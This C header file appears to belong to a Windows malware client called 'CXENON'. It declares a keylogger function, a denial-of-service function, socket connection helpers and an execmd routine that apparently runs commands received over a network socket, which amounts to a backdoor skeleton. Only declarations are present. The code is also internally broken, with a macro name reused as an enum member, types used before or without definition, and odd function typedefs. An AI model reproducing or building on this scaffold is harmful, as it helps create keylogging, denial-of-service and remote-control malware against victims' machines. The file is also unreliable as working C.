#ifndef CXENONh_H
#define CXENONh_H


#define Exit -2
#define UNKNOWN 2
#define INADDR_NONE -1

#if defined(_WIN32)


int WININIT(void);

char* keylogger(void);
void DOS(void);

enum _USTATUS
{

	ONLINE=0x00,
	OFFLINE=0x01,
	UNKNOWN=0x02

};


typedef int SOCKET;
typedef unsigned short ushort;
typedef unsigned int uint32_t;


typedef SOCKET (socket)(int domain, int type, int protocol);
typedef int (connect)(int sockfd, const struct sockaddr* addr, size_t addrlen);


struct sockaddr
{
	ushort sa_family;
	char sa_data[14];
};

struct sockaddr_in
{
	short   sin_family;
	u_short sin_port;
	struct  in_addr sin_addr;
	char    sin_zero[8];
};


typedef struct
{

	int dstport;
	char* dstaddr;

} ClientCTX, *pClientCTX;


#endif

uint32_t inet_addr(const char* ip);
pClientCTX CliInit(void);
SOCKET client_socket(SOCKET Socket);
SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
int execmd(SOCKET Socket);

#endif